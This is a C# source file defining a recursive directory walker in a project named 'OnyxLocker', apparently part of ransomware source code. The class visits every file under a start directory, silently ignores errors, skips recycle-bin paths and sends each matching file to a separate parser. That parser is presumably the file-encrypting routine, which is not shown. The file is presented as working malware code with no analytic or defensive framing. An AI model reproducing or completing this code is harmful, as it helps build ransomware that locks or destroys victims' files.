using System.IO;

namespace OnyxLocker
{
    internal class DirWalker
    {
        private IFileChecker FileChecker { get; set; }
        private IFileParser FileParser { get; set; }

        public DirWalker(IFileChecker fileChecker, IFileParser fileParser)
        {
            FileChecker = fileChecker;
            FileParser = fileParser;
        }

        public void TraverseDirectories(string startDirectory)
        {
            try
            {
                // Process all the file in the directories
                var fileEntries = Directory.GetFiles(startDirectory);
                for (var i = 0; i < fileEntries.Length; i++)
                {
                    ProcessFile(fileEntries[i].ToLower());
                    System.Threading.Thread.Sleep(1);
                }
            }
            catch
            {
            }

            try
            {
                // Recursive
                // Traverse the next found directory
                var subdirectoryEntries = Directory.GetDirectories(startDirectory);
                for (var i = 0; i < subdirectoryEntries.Length; i++)
                {
                    var subdirectory = subdirectoryEntries[i];
                    TraverseDirectories(subdirectory);
                    System.Threading.Thread.Sleep(1);
                }
            }
            catch
            {
            }
        }

        private void ProcessFile(string filePath)
        {
            if (IsTargetFile(filePath))
            {
                FileParser.ParseFile(filePath);
            }
        }

        private bool IsTargetFile(string filePath)
        {
            return !filePath.Contains("recycle") && FileChecker.IsTargetFile(filePath);
        }
    }
}